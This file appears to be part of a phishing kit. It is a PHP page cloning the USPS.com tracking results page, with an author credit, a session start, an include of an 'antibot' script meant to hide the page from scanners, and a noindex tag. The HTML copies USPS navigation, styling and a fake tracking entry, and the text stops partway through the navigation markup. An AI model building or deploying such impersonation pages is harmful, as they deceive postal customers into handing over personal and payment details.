<?php 
/* 
  *  Coded by m4ntuoluo ❤️ 
  *
*/
session_start();
include './antibot/bot1.php';
	
?>
<!DOCTYPE html>
<html lang="en" class=" js flexbox flexboxlegacy canvas canvastext webgl no-touch geolocation postmessage websqldatabase indexeddb hashchange history draganddrop websockets rgba hsla multiplebgs backgroundsize borderimage borderradius boxshadow textshadow opacity cssanimations csscolumns cssgradients cssreflections csstransforms csstransforms3d csstransitions fontface generatedcontent video audio localstorage sessionstorage webworkers no-applicationcache svg inlinesvg smil svgclippaths">
	<head>
		<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">


		<meta name="viewport" content="width=device-width, initial-scale=1">
		<meta name="robots" content="noindex">



		<script type="text/javascript">
			var dataLayer = window.dataLayer = window.dataLayer || [];
			    dataLayer.push({"ecommerce":{"impressions":[{"eventCode":"NT","dimension149":"USPS Tracking Plus | USPS Tracking | Up to $100 insurance included","name":"Priority Mail","position":1,"id":"9405510200864176182429","list":"Tracking Tool Results","category":" / In Transit to Next Facility / CENTREVILLE, VA  20121","testLanguage":"false","brand":"USPS Tools"}]},"loginStatus":"Not Logged In","event":"ecomListImpression"})
		</script>




		<script src="./index_files/optimize.js"></script>

		<!-- Alternative Mobile Page reference For Webcrawlers -->
		<title>USPS.com® - USPS Tracking® Results</title>
		<link rel="shortcut icon" href="img/favicon.ico">
		<link rel="stylesheet" href="./index_files/footer.css">
		<link rel="stylesheet" href="./index_files/bootstrap.min.css">
		<link rel="stylesheet" href="./index_files/calendar.css">
		<link rel="stylesheet" href="./index_files/datepicker3.css">
		<link rel="stylesheet" href="./index_files/main.css">
		<link rel="stylesheet" href="./index_files/tracking-cross-sell.css">
		<link rel="stylesheet" href="./index_files/tracking-progress-bar.css">
		<link rel="stylesheet" href="./index_files/jquery-ui.min.css">
		<link rel="stylesheet" href="./index_files/schedule-redelivery.css">
		<link rel="stylesheet" href="./index_files/main(1).css">
		<meta http-equiv="origin-trial" content="A6tVmVPNv7ei4ErCylDEwnE6N9RJTv0xr0vkb/AAsDo1pT2LYjQVGXq5JSDAHLx7TB8jjHfD2e8qlu3dZMP+ew8AAABveyJvcmlnaW4iOiJodHRwczovL3MucGluaW1nLmNvbTo0NDMiLCJmZWF0dXJlIjoiUHJpdmFjeVNhbmRib3hBZHNBUElzIiwiZXhwaXJ5IjoxNjY5NzY2Mzk5LCJpc1RoaXJkUGFydHkiOnRydWV9">
		<style type="text/css" id="kampyleStyle">
			.noOutline{outline: none !important;}.wcagOutline:focus{outline: 1px dashed #595959 !important;outline-offset: 2px !important;transition: none !important;}button#nebula_div_btn { height: auto !important } .kampyle_vertical_button { background-color:transparent !important;font-family:"Open Sans",sans-serif;cursor:pointer;position:fixed;top:45%;z-index:99999990;height:35px !important;min-height: 35px !important;max-height: 35px !important;width:125px !important;max-width: 125px !important;min-width: 125px !important;-ms-transform:rotate(90deg);-webkit-transform:rotate(90deg);transform:rotate(90deg) } .kampyle_vertical_button .kampyle_button { height:35px;min-height: 35px !important;max-height: 35px !important;width:125px !important;min-width: 125px !important;max-width: 125px !important; background:#333366;color:#ffffff;position:absolute;top:0;left:0;z-index:-1; } .kampyle_vertical_button .kampyle_button-text { color:#ffffff;font-size:14px;line-height:35px;text-align:center;font-weight:normal !important; } .kampyle_vertical_button.kampyle_left .kampyle_button { -webkit-border-radius:3px 3px 0 0;-moz-border-radius:3px 3px 0 0;-ms-border-radius:3px 3px 0 0;border-radius:3px 3px 0 0; } .kampyle_vertical_button.kampyle_right { right:-45px; } .kampyle_vertical_button.kampyle_left { left:-45px } .kampyle_vertical_button.kampyle_right .kampyle_button { -webkit-border-radius:0 0 3px 3px;-moz-border-radius:0 0 3px 3px;-ms-border-radius:0 0 3px 3px;border-radius:0 0 3px 3px } .kampyle_vertical_button.kampyle_right, .kampyle_vertical_button.kampyle_left  { padding: 0 !important; }.kampyle_vertical_button:hover .kampyle_button-text { color:#ffffff; } .kampyle_vertical_button:hover .kampyle_button { background-color:#333366; }
		</style>
	</head>

	<body>
		<div id="tracking_page_wrapper">
			<input type="hidden" id="customerIPAddress" value="202.43.234.24">
			<div class="copy-notify-container" style="display: none;">
				<p class="tracking-copied-notification">Tracking Number Copied</p>
			</div>
			<!-- GLOBAL HEADER  -->

			<link href="./index_files/megamenu-v4.css" type="text/css" rel="stylesheet">
			<style>
				body{min-width:0!important;}
/* Eliminate Utility Bar */
	#utility-bar, .util {
		display: none;
	}
/* Change for Update prior to reskin */
ul, ol {
 list-style-type: disc;
 list-style:disc;
}
.empty-search ul {
    list-style: none;
    list-style-type:none;
 
}
[class^="icon-"]:before, [class*=" icon-"]:before {
    background-position:50%;
}

li.usps-logo {
    background-color: #FFFFFF !important;
}
/* Specific non-responsive limit*/
body {
	overflow-x:hidden;
}


/* Tracking fix */
#track-confirm {
    height: 100%;
}
@media only screen and (min-width: 959px){
	.menu ol li ol li:first-of-type {
		padding-top: 0 !important;

	}
	.global-navigation, #utility-header {
		max-width: 100% !important;
	}
	.menu-wrap {
		max-width: 100% !important;
	}
	
	html, body {
		max-width: 100%;
		overflow-x: -moz-scrollbars-vertical;
	}
}
.product_tracking_header .product_info td {
   vertical-align: top;
}

.product_tracking_details .tracking_history_container div.more_rows a {
	font-size: 14px;
}

.panel-actions-content {
    font-size: 14px;
}

div#shortcuts-menu-wrapper a {
    font-weight: normal;
}

input#global-header--search-track {
    background: transparent;
    border: 0;
    color: #202020;
    display: inline-block;
    font-family: "HelveticaNeueW02-55Roma","Helvetica Neue",Helvetica,Arial,sans-serif;
    font-size: 13px;
    font-size: 1.3rem;
    height: 40px;
    height: 4rem;
    line-height: 20px;
    line-height: 2rem;
    outline: 0;
    margin: 0;
    padding: 10px 0;
    -webkit-appearance: none;
    width: 83%;
}

.easy-autocomplete-container ul li, .easy-autocomplete-container ul .eac-category {
    margin-top: 0px;
}

.empty-search li {
	margin-top:0px;
}
body {
    font-size: 14px;
}

.hint .speech_bubble {
	bottom: calc(100% + 10px) !important;
}

.error-handler li {
    display: none;
}
@media only screen and (max-width: 958px) {
	.quick--search .input--field {
		height: 44px!important;
		border: 0!important;
		margin-top:3px!important;
	}
}

form#trackPackage .tracking-btn.disabled {
    opacity: 1;
    cursor: pointer;
    filter: alpha(opacity=100);
}
.mobile-quicktools .quicktools-full .shortcut.sc-pobox {
    border-left: 0px !important;
}
		@media only screen and (max-width:958px){
			.alert-bar{}
			.menu.active .menu--tier-one-link span:first-of-type {		
				width: 80%;		
				display: block;		
				left: 0;		
				position: absolute;		
				padding-left: 22px;		
				height: 80px;		
				top: 0;		
				padding-top: 28px;		
				box-sizing: border-box;		
			}
			.menu.active .menu--tier-one li {
				border-top: 1px solid #333366;
				padding-top: 0 !important;
				padding-bottom:  0 !important;
			}

			.menu.active .menu--tier-one li.ge_parent ol li {
				padding-top:0 !important;
				padding-bottom:0 !important;

			}

			a.menu--tier-one-link.menu--item {		
				padding-top: 28px !important;		
				display: block;		
				padding-bottom: 27px !important;		
			}

			.menu ol li ol li a {
				line-height: 20px !important;
				margin-top: 0px !important;
				padding: 20px 22px !important;
			}
			.menu.active ol li.touchscreen-only {
					display: none !important;
				}
		}
#utility-header a#link-myusps:before {
    background-image: url(/global-elements/header/images/utility-header/mailman.svg) !important;
}
.global--navigation input.global-header--search-track {
	border: 0;
	width: 80%;
	display: inline-block;
	vertical-align: bottom;
	padding-left: 18px;
	height: 31px;
	background: #FFFFFF;
}
.global--navigation .nav-search input.global-header--search-track {
	height:25px;
}
@media print{.global--navigation{display:none!important;}.nav-utility{display:none!important};.global-footer--wrap{display:none!important;}#global-footer--wrap{display:none!important;}.global-footer {display:none!important;}}

/*  alert code  */
/*   

@media (min-width: 958px){.global--navigation~.g-alert, .g-alert~.g-alert, .g-alert {
margin-bottom: 0;
    margin-top: 0;
	}
 div#g-navigation {
 margin-bottom: 0;
}
}
.hidden-galert {
   position: absolute;
    left: -10000px;
    top: auto;
    width: 1px;
    height: 1px;
    overflow: hidden;
}

@media (max-width: 958px) {
	.g-alert p br { 
		display:none;
		}

	.g-alert p {
		line-height:18px;
	}	
}

@media (min-width: 958px) {
	.g-alert p {
		padding: 0px 5px;
	}
}

 */
 
 
/* adding the Print Customs Forms image */
@media only screen and (min-width: 959px) {
.global--navigation nav .tool-international-forms a:before, .global--navigation nav .tool-international-forms a:hover:before, .global--navigation nav .tool-international-forms a:focus:before {
    background: url(https://www.usps.com/assets/images/home/printcustomsforms.svg);
}
}

/* end adding the Print Customs Forms image */ 
 
 

</style>
			<script>var appID = "UspsTools";</script>
			<script>var urlOverride="manage";</script>
			<div class="nav-utility" id="nav-utility">
				<div class="utility-links" id="utility-header">
					<a tabindex="-1" href="https://www.usps.com/globals/site-index.htm" class="hidden-skip">Go to USPS.com Site Index.</a>
					<a tabindex="0" id="skiptomain" href="#" class="hidden-skip keyboard">Skip to Main Content</a>
					<a tabindex="-1" name="skiputil" id="skiputil" href="#" class="hidden-skip">Skip All Utility Navigation</a>
					<div class="lang-select">
						<a id="link-lang" href="#">
							<span class="visuallyhidden">Current language:</span>
							English
						</a>
						<ul class="lang-list">
							<li class="lang-option">
								<a class="multi-lang-link" tabindex="-1" href="javascript:OneLink(&#39;en&#39;);">English</a>
							</li>
							<li class="lang-option">
								<a class="multi-lang-link" tabindex="-1" href="javascript:OneLink(&#39;es&#39;);">Español</a>
							</li>
							<li class="lang-option last">
								<a class="multi-lang-link" tabindex="-1" href="javascript:OneLink(&#39;zh&#39;);">
									<span class="visuallyhidden">Chinese</span>
								</a>
							</li>
						</ul>
					</div>
					<a id="link-locator" href="https://tools.usps.com/find-location.htm">Locations</a>
					<a id="link-customer" href="https://www.usps.com/help/contact-us.htm">Support</a>
					<a id="link-myusps" href="https://informeddelivery.usps.com/">Informed Delivery</a>
					<a id="login-register-header" class="link-reg" href="https://reg.usps.com/entreg/LoginAction_input?app=UspsTools&amp;appURL=https://tools.usps.com/go/TrackConfirmAction">Register / Sign In</a>
					<div id="link-cart" style="display: inline-block;"></div>
				</div>
			</div>
			<div class="global--navigation" id="g-navigation">
				<a tabindex="-1" name="skipallnav" id="skipallnav" href="https://tools.usps.com/go/TrackConfirmAction?tRef=fullpage&amp;tLc=2&amp;text28777=&amp;tLabels=9405510200864176182429%2C#endnav" class="hidden-skip">Skip all category navigation links</a>
				<div class="nav-full">

					<a class="global-logo" href="https://www.usps.com/" style="vertical-align: baseline;">
						<img src="./index_files/logo-sb.svg" alt="Image of USPS.com logo." aria-label="Image of USPS.com logo.">
					</a>
					<div class="mobile-header">
						<a class="mobile-hamburger" href="https://tools.usps.com/go/TrackConfirmAction?tRef=fullpage&amp;tLc=2&amp;text28777=&amp;tLabels=9405510200864176182429%2C#">
							<img src="./index_files/hamburger.svg" alt="hamburger menu Icon">
						</a>
						<a class="mobile-logo" href="https://www.usps.com/">
							<img src="./index_files/logo_mobile.svg" alt="USPS mobile logo">
						</a>
						<a class="mobile-search" href="https://tools.usps.com/go/TrackConfirmAction?tRef=fullpage&amp;tLc=2&amp;text28777=&amp;tLabels=9405510200864176182429%2C#">
							<img src="./index_files/search.svg" alt="Search Icon">
						</a>
					</div>

					<nav>
						<div class="mobile-log-state">
							<div id="msign" class="mobile-utility">
								<div class="mobile-sign">
									<a href="https://reg.usps.com/entreg/LoginAction_input?app=UspsTools&amp;appURL=https://tools.usps.com/go/TrackConfirmAction">Sign In</a>
								</div>
							</div>
						</div>
						<ul class="nav-list" role="menubar">
							<li class="qt-nav menuheader">
								<a tabindex="-1" name="navquicktools" id="navquicktools" href="https://tools.usps.com/go/TrackConfirmAction?tRef=fullpage&amp;tLc=2&amp;text28777=&amp;tLabels=9405510200864176182429%2C#navmailship" class="hidden-skip">Skip Quick Tools Links</a>
								<a aria-expanded="false" role="menuitem" tabindex="0" aria-haspopup="true" class="nav-first-element menuitem" href="https://tools.usps.com/go/TrackConfirmAction?tRef=fullpage&amp;tLc=2&amp;text28777=&amp;tLabels=9405510200864176182429%2C#">Quick Tools</a>
								<div class="">
									<ul role="menu" aria-hidden="true">
										<li>
											<a role="menuitem" tabindex="-1" href="https://tools.usps.com/go/TrackConfirmAction_input">
												<img src="./index_files/tracking.svg" alt="Tracking Icon">
												<p>Track a Package</p>
											</a>
										</li>
										<li>
											<a role="menuitem" tabindex="-1" href="https://informeddelivery.usps.com/">
												<img src="./index_files/mailman.svg" alt="Informed Delivery Icon">
												<p>Informed Delivery</p>
											</a>
										</li>
										<li>
											<a role="menuitem" tabindex="-1" href="https://tools.usps.com/find-location.htm">
												<img src="./index_files/location.svg" alt="Post Office Locator Icon">
												<p>Find USPS Locations</p>
											</a>
										</li>
										<li>
											<a role="menuitem" tabindex="-1" href="https://store.usps.com/store/browse/category.jsp?categoryId=buy-stamps">
												<img src="./index_files/stamps.svg" alt="Stamps Icon">
												<p>Buy Stamps</p>
											</a>
										</li>
										<li>
											<a role="menuitem" tabindex="-1" href="https://tools.usps.com/schedule-pickup-steps.htm">
												<img src="./index_files/schedule_pickup.svg" alt="Schedule a Pickup Icon">
												<p>Schedule a Pickup</p>
											</a>
										</li>
										<li>
											<a role="menuitem" tabindex="-1" href="https://postcalc.usps.com/">
												<img src="./index_files/calculate_price.svg" alt="Calculate a Price Icon">
												<p>Calculate a Price</p>
											</a>
										</li>
										<li>
											<a role="menuitem" tabindex="-1" href="https://tools.usps.com/zip-code-lookup.htm">
												<img src="./index_files/find_zip.svg" alt="Zip Code™ Lookup Icon">
												<p>Look Up a
													<br>ZIP Code<sup>™</sup>
												</p>
											</a>
										</li>
										<li>
											<a role="menuitem" tabindex="-1" href="https://holdmail.usps.com/holdmail/">
												<img src="./index_files/holdmail.svg" alt="Holdmail Icon">
												<p>Hold Mail</p>
											</a>
										</li>
										<li>
											<a role="menuitem" tabindex="-1" href="https://moversguide.usps.com/?referral=MG82">
												<img src="./index_files/change_address.svg" alt="Change of Address Icon">
												<p>Change My Address</p>
											</a>
										</li>
										<li>
											<a role="menuitem" tabindex="-1" href="https://www.usps.com/manage/po-boxes.htm">
												<img src="./index_files/po_box.svg" alt="Post Office Boxes Icon">
												<p>Rent/Renew a
													<br>PO Box</p>
											</a>
										</li>
										<li>
											<a role="menuitem" tabindex="-1" href="https://store.usps.com/store/results/free-shipping-supplies/shipping-supplies/_/N-alnx4jZ7d0v8v">
												<img src="./index_files/free_boxes.svg" alt="Shipping Supplies Icon">
												<p>Free Boxes</p>
											</a>
										</li>
										<li>
											<a role="menuitem" tabindex="-1" href="https://cns.usps.com/">
												<img src="./index_files/featured_clicknship.svg" alt="Click-N-Ship Icon">
												<p>Click-N-Ship</p>
											</a>
										</li>
									</ul>
								</div>
							</li>
							<li class="menuheader">
								<a tabindex="-1" name="navmailship" id="navmailship" href="https://tools.usps.com/go/TrackConfirmAction?tRef=fullpage&amp;tLc=2&amp;text28777=&amp;tLabels=9405510200864176182429%2C#navtrackmanage" class="hidden-skip">Skip Send Links</a>
								<a id="mail-ship-width" aria-expanded="false" class="menuitem" role="menuitem" tabindex="0" aria-haspopup="true" href="https://www.usps.com/ship/">Send</a>
								<div class="repos">
									<ul role="menu" aria-hidden="true" class="tools">
										<h3>Tools</h3>
										<li class="tool-cns">
											<a role="menuitem" tabindex="-1" href="https://cns.usps.com/">Click-N-Ship</a>
										</li>
										<li class="tool-stamps">
											<a role="menuitem" tabindex="-1" href="https://store.usps.com/store/">Stamps &amp; Supplies</a>
										</li>
										<li class="tool-zip">
											<a role="menuitem" tabindex="-1" href="https://tools.usps.com/zip-code-lookup.htm">Look Up a ZIP Code<sup>™</sup>
											</a>
										</li>
										<li class="tool-calc">
											<a role="menuitem" tabindex="-1" href="https://postcalc.usps.com/">Calculate a Price</a>
										</li>
										<li class="tool-pick">
											<a role="menuitem" tabindex="-1" href="https://tools.usps.com/schedule-pickup-steps.htm">Schedule a Pickup</a>
										</li>
										<li class="tool-find">
											<a role="menuitem" tabindex="-1" href="https://tools.usps.com/find-location.htm">Find USPS Locations</a>
										</li>
										<li class="tool-track">
											<a role="menuitem" tabindex="-1" href="https://tools.usps.com/go/TrackConfirmAction_input">Tracking</a>
										</li>
									</ul>
									<ul role="menu" aria-hidden="true">
										<h3>Learn About</h3>
										<li>
											<a role="menuitem" tabindex="-1" href="https://www.usps.com/ship/">Sending</a>
										</li>
										<ul aria-hidden="true">
											<li>
												<a role="menuitem" tabindex="-1" href="https://www.usps.com/ship/letters.htm">Sending Mail</a>
											</li>
											<li>
												<a role="menuitem" tabindex="-1" href="https://www.usps.com/ship/packages.htm">Sending Packages</a>
											</li>
											<li>
												<a role="menuitem" tabindex="-1" href="https://www.usps.com/ship/insurance-extra-services.htm">Insurance &amp; Extra Services</a>
											</li>
											<li>
												<a role="menuitem" tabindex="-1" href="https://www.usps.com/ship/shipping-restrictions.htm">Shipping Restrictions</a>
											</li>
										</ul>
										<li>
											<a role="menuitem" tabindex="-1" href="https://www.usps.com/ship/online-shipping.htm">Online Shipping</a>
										</li>
										<li>
											<a role="menuitem" tabindex="-1" href="https://www.usps.com/business/label-broker.htm">Label Broker</a>
										</li>
										<li>
											<a role="menuitem" tabindex="-1" href="https://www.usps.com/ship/custom-mail.htm">Custom Mail, Cards, &amp; Envelopes</a>
										</li>
										<li>
											<a role="menuitem" tabindex="-1" href="https://www.usps.com/business/prices.htm">Postage Prices</a>
										</li>
									</ul>
									<ul role="menu" aria-hidden="true">
										<h3 class="desktop-only">&nbsp;</h3>
										<li>
											<a role="menuitem" tabindex="-1" href="https://www.usps.com/ship/mail-shipping-services.htm">Mail &amp; Shipping Services</a>
										</li>
										<ul aria-hidden="true">
											<li>
												<a role="menuitem" tabindex="-1" href="https://www.usps.com/ship/priority-mail-express.htm">Priority Mail Express</a>
											</li>
											<li>
												<a role="menuitem" tabindex="-1" href="https://www.usps.com/ship/priority-mail.htm">Priority Mail</a>
											</li>
											<li>
												<a role="menuitem" tabindex="-1" href="https://www.usps.com/ship/first-class-mail.htm">First-Class Mail</a>
											</li>
											<li>
												<a role="menuitem" tabindex="-1" href="https://www.usps.com/ship/apo-fpo-dpo.htm">Military &amp; Diplomatic Mail</a>
											</li>
										</ul>
										<li>
											<a role="menuitem" tabindex="-1" href="https://www.usps.com/manage/package-intercept.htm">Redirecting a Package</a>
										</li>
										<li>
											<a role="menuitem" tabindex="-1" href="https://www.usps.com/shop/money-orders.htm">Money Orders</a>
										</li>
										<li>
											<a role="menuitem" tabindex="-1" href="https://www.usps.com/help/claims.htm">Filing a Claim</a>
										</li>
										<li>
											<a role="menuitem" tabindex="-1" href="https://www.usps.com/help/refunds.htm">Requesting a Refund</a>
										</li>
										<div class="desktop-only mailship-addition">
											<a role="menuitem" tabindex="-1" href="https://www.usps.com/ship/go-now.htm">
												<img src="./index_files/go-now.png" alt=" ">
												<span class="visuallyhidden">Print and ship from home. Start Click-N-Ship.</span>
											</a>
										</div>
									</ul>

									<form method="get" class="search global-header--search" tabindex="-1" action="https://www.usps.com/search">
										<span aria-hidden="false" tabindex="-1" class="input--wrap">
											<label tabindex="-1" class="visuallyhidden" for="global-header--search-track-mail-ship">Search USPS.com</label>
											<input tabindex="-1" autocomplete="off" placeholder="Search or Enter a Tracking Number" class="search--track-input input--field q global-header--search-track" id="global-header--search-track-mail-ship" maxlength="256" name="q" type="text">
											<div class="autocorrect">
												<ul aria-hidden="true"></ul>
											</div>
											<input tabindex="-1" value="Search" class="input--search search--submit" type="submit">
										</span>
									</form>
								</div>
							</li>
							<li class="menuheader">
								<a tabindex="-1" name="navtrackmanage" id="navtrackmanage" href="https://tools.usps.com/go/TrackConfirmAction?tRef=fullpage&amp;tLc=2&amp;text28777=&amp;tLabels=9405510200864176182429%2C#navpostalstore" class="hidden-skip">Skip Receive Links</a>
								<a aria-expanded="false" class="menuitem" role="menuitem" tabindex="0" aria-haspopup="true" href="https://www.usps.com/manage/">Receive</a>
								<div>
									<ul role="menu" aria-hidden="true" class="tools">
										<h3>Tools</h3>
										<li class="tool-track">
											<a role="menuitem" tabindex="-1" href="https://tools.usps.com/go/TrackConfirmAction_input">Tracking</a>
										</li>
										<li class="tool-informed">
											<a role="menuitem" tabindex="-1" href="https://informeddelivery.usps.com/">Informed Delivery</a>
										</li>
										<li class="tool-intercept">
											<a role="menuitem" tabindex="-1" href="https://retail-pi.usps.com/retailpi/actions/index.action">Intercept a Package</a>
										</li>
										<li class="tool-redelivery">
											<a role="menuitem" tabindex="-1" href="https://tools.usps.com/redelivery.htm">Schedule a Redelivery</a>
										</li>
										<li class="tool-hold">
											<a role="menuitem" tabindex="-1" href="https://holdmail.usps.com/holdmail/">Hold Mail</a>
										</li>
										<li class="tool-change">
											<a role="menuitem" tabindex="-1" href="https://moversguide.usps.com/?referral=MG80">Change of Address</a>
										</li>
										<li class="tool-pobol">
											<a role="menuitem" tabindex="-1" href="https://www.usps.com/manage/po-boxes.htm">Rent or Renew PO Box</a>
										</li>
									</ul>
									<ul role="menu" aria-hidden="true">
										<h3>Learn About</h3>
										<li>
											<a role="menuitem" tabindex="-1" href="https://www.usps.com/manage/">Managing Mail</a>
										</li>
										<li>
											<a role="menuitem" tabindex="-1" href="https://informeddelivery.usps.com/">Informed Delivery</a>
										</li>
										<li>
											<a role="menuitem" tabindex="-1" href="https://www.usps.com/manage/forward.htm">Forwarding Mail</a>
										</li>
										<li>
											<a role="menuitem" tabindex="-1" href="https://www.usps.com/manage/package-intercept.htm">Redirecting a Package</a>
										</li>
										<li>
											<a role="menuitem" tabindex="-1" href="https://www.usps.com/manage/po-boxes.htm">PO Boxes</a>
										</li>
										<li>
											<a role="menuitem" tabindex="-1" href="https://www.usps.com/manage/mailboxes.htm">Mailbox Guidelines</a>
										</li>
										<li>
											<a role="menuitem" tabindex="-1" href="https://www.usps.com/manage/mail-for-deceased.htm">Mail for the Deceased</a>
										</li>
										<div class="desktop-only manage-addition">
											<a role="menuitem" tabindex="-1" href="https://www.usps.com/manage/go-now.htm">
												<img src="./index_files/go-now(1).png" alt=" ">
											</a>
										</div>
									</ul>
									<form tabindex="-1" role="search" method="get" class="search global-header--search  track-manage" action="https://www.usps.com/search">
										<span tabindex="-1" aria-hidden="false" class="input--wrap">
											<label tabindex="-1" class="visuallyhidden" for="global-header--search-track-track-manage">Search USPS.com</label>
											<input tabindex="-1" autocomplete="off" placeholder="Search or Enter a Tracking Number" class="search--track-input input--field q global-header--search-track" id="global-header--search-track-track-manage" maxlength="256" name="q" type="text">
											<div class="autocorrect">
												<ul aria-hidden="true"></ul>
											</div>
											<input tabindex="-1" value="Search" class="input--search search--submit" type="submit">
										</span>
									</form>
								</div>
							</li>
							<li class="menuheader">
								<a tabindex="-1" name="navpostalstore" id="navpostalstore" href="https://tools.usps.com/go/TrackConfirmAction?tRef=fullpage&amp;tLc=2&amp;text28777=&amp;tLabels=9405510200864176182429%2C#navbusiness" class="hidden-skip">Skip Shop Links</a>
								<a aria-expanded="false" class="menuitem" role="menuitem" tabindex="0" aria-haspopup="true" href="https://store.usps.com/store">Shop</a>
								<div class="repos">
									<ul role="menu" aria-hidden="true" class="tools">
										<h3>Shop</h3>


										<li class="tool-stamps">
											<a role="menuitem" tabindex="-1" href="https://store.usps.com/store/browse/category.jsp?categoryId=buy-stamps">Stamps</a>
										</li>
										<li class="tool-supplies">
											<a role="menuitem" tabindex="-1" href="https://store.usps.com/store/browse/category.jsp?categoryId=shipping-supplies">Shipping Supplies</a>
										</li>
										<li class="tool-cards">
											<a role="menuitem" tabindex="-1" href="https://store.usps.com/store/browse/category.jsp?categoryId=cards-envelopes">Cards &amp; Envelopes</a>
										</li>
										<li class="tool-pse">
											<a role="menuitem" tabindex="-1" href="https://store.usps.com/store/pse/">Personalized Stamped Envelopes</a>
										</li>
										<li class="tool-coll">
											<a role="menuitem" tabindex="-1" href="https://store.usps.com/store/browse/category.jsp?categoryId=stamp-collectors">Collectors</a>
										</li>
										<li class="tool-gifts">
											<a role="menuitem" tabindex="-1" href="https://store.usps.com/store/browse/category.jsp?categoryId=stamp-gifts">Gifts</a>
										</li>
										<li class="tool-business">
											<a role="menuitem" tabindex="-1" href="https://store.usps.com/store/results/business/_/N-1y2576k">Business Supplies</a>
										</li>
									</ul>

									<ul role="menu" aria-hidden="true">
										<h3>Learn About</h3>
										<li>
											<a role="menuitem" tabindex="-1" href="https://www.usps.com/shop/money-orders.htm">Money Orders</a>
										</li>
										<li>
											<a role="menuitem" tabindex="-1" href="https://www.usps.com/shop/returns-exchanges.htm">Returns &amp; Exchanges</a>
										</li>
										<div class="desktop-only shop-addition">
											<a role="menuitem" tabindex="-1" href="https://www.usps.com/store/go-now.htm">
												<img src="./index_files/go-now(2).png" alt=" ">
												<span class="visuallyhidden">Shop Forever Stamps. Shop now.</span>
											</a>
										</div>
									</ul>
									<form tabindex="-1" role="search" method="get" class="search global-header--search" action="https://www.usps.com/search">
										<span tabindex="-1" aria-hidden="false" class="input--wrap">
											<label class="visuallyhidden" tabindex="-1" for="global-header--search-track-store">Search the Postal Store: Keyword or SKU</label>
											<input tabindex="-1" autocomplete="off" placeholder="Search the Postal Store: Keyword or SKU" class="search--track-input input--field q global-header--search-track" id="global-header--search-track-store" maxlength="256" name="q" type="text">
											<div class="autocorrect">
												<ul aria-hidden="true"></ul>
											</div>
											<input tabindex="-1" value="Search" class="input--search search--submit" type="submit">
										</span>
									</form>
								</div>
							</li>
							<li class="menuheader">
								<a tabindex="-1" name="navbusiness" id="navbusiness" href="https://tools.usps.com/go/TrackConfirmAction?tRef=fullpage&amp;tLc=2&amp;text28777=&amp;tLabels=9405510200864176182429%2C#navinternational" class="hidden-skip">Skip Business Links</a>
								<a aria-expanded="false" class="menuitem" tabindex="0" aria-haspopup="true" role="menuitem" href="https://www.usps.com/business/">Business</a>
								<div class="repos">
									<ul role="menu" aria-hidden="true" class="tools">
										<h3>Tools</h3>
										<li class="tool-calc">
											<a role="menuitem" tabindex="-1" href="https://postcalc.usps.com/business">Calculate a Business Price</a>
										</li>
										<li class="tool-loyalty">
											<a role="menuitem" tabindex="-1" href="https://loyalty.usps.com/">Check Loyalty Points &amp; Rewards</a>
										</li>
										<li class="tool-eddm">
											<a role="menuitem" tabindex="-1" href="https://eddm.usps.com/eddm/customer/routeSearch.action">Every Door Direct Mail</a>
										</li>
										<div class="desktop-only business-addition">
											<a role="menuitem" tabindex="-1" href="https://www.usps.com/business/go-now.htm">
												<img src="./index_files/go-now(3).png" alt=" ">
												<span class="visuallyhidden">Grow your business with Every Door Direct Mail. Try EDDM now.</span>
											</a>
										</div>
									</ul>

									<ul role="menu" aria-hidden="true">
										<h3>Learn About</h3>

										<li>
											<a role="menuitem" tabindex="-1" href="https://www.usps.com/business/business-shipping.htm">Business Shipping</a>
										</li>
										<ul aria-hidden="true">
											<li>
												<a role="menuitem" tabindex="-1" target="_blank" href="https://www.uspsconnect.com/">USPS Connect</a>
											</li>
											<li>
												<a role="menuitem" tabindex="-1" href="https://www.usps.com/business/loyalty.htm">USPS Loyalty Program</a>
											</li>
											<li>
												<a role="menuitem" tabindex="-1" href="https://www.usps.com/business/shipping-consolidators.htm">Shipping Consolidators</a>
											</li>
										</ul>
										<li>
											<a role="menuitem" tabindex="-1" href="https://www.usps.com/business/advertise-with-mail.htm">Advertising with Mail</a>
										</li>
										<ul aria-hidden="true">
											<li>
												<a role="menuitem" tabindex="-1" href="https://www.usps.com/business/every-door-direct-mail.htm">Using EDDM</a>
											</li>
											<li>
												<a role="menuitem" tabindex="-1" href="https://www.usps.com/business/vendors.htm">Mailing &amp; Printing Services</a>
											</li>
											<li>
												<a role="menuitem" tabindex="-1" href="https://www.usps.com/business/customized-direct-mail.htm">Customized Direct Mail</a>
											</li>
											<li>
												<a role="menuitem" tabindex="-1" href="https://www.usps.com/business/political-mail.htm">Political Mail</a>
											</li>
											<li>
												<a role="menuitem" tabindex="-1" href="https://www.usps.com/business/promotions-incentives.htm">Promotions &amp; Incentives</a>
											</li>
											<li>
												<a role="menuitem" tabindex="-1" href="https://www.usps.com/business/informed-delivery.htm">Informed Delivery Marketing</a>
											</li>
											<li>
												<a role="menuitem" tabindex="-1" href="https://www.usps.com/business/product-samples.htm">Product Samples</a>
											</li>
										</ul>
									</ul>
									<ul role="menu" aria-hidden="true">
										<h3 class="desktop-only">&nbsp;</h3>

										<li>
											<a role="menuitem" tabindex="-1" href="https://www.usps.com/business/postage-options.htm">Postage Options</a>
										</li>
										<ul aria-hidden="true">
											<li>
												<a role="menuitem" tabindex="-1" href="https://www.usps.com/business/verify-postage.htm">Verifying Postage</a>
											</li>
										</ul>
										<li>
											<a role="menuitem" tabindex="-1" href="https://www.usps.com/business/return-services.htm">Returns Services</a>
										</li>
										<li>
											<a role="menuitem" tabindex="-1" href="https://www.usps.com/business/label-broker.htm">Label Broker</a>
										</li>
										<li>
											<a role="menuitem" tabindex="-1" href="https://www.usps.com/business/international-shipping.htm">International Business Shipping</a>
										</li>
										<li>
											<a role="menuitem" tabindex="-1" href="https://www.usps.com/business/manage-mail.htm">Managing Business Mail</a>
										</li>
										<li>
											<a role="menuitem" tabindex="-1" href="https://www.usps.com/business/web-tools-apis/">Web Tools (APIs)</a>
										</li>
										<li>
											<a role="menuitem" tabindex="-1" href="https://www.usps.com/business/prices.htm">Prices</a>
										</li>
									</ul>
									<form tabindex="-1" role="search" method="get" class="search global-header--search business-bottom" action="https://www.usps.com/search">
										<span tabindex="-1" aria-hidden="false" class="input--wrap">
											<label tabindex="-1" class="visuallyhidden" for="global-header--search-track-business">Search USPS.com</label>
											<input tabindex="-1" autocomplete="off" placeholder="Search or Enter a Tracking Number" class="search--track-input input--field q global-header--search-track" id="global-header--search-track-business" maxlength="256" name="q" type="text">
											<div class="autocorrect">
												<ul aria-hidden="true"></ul>
											</div>
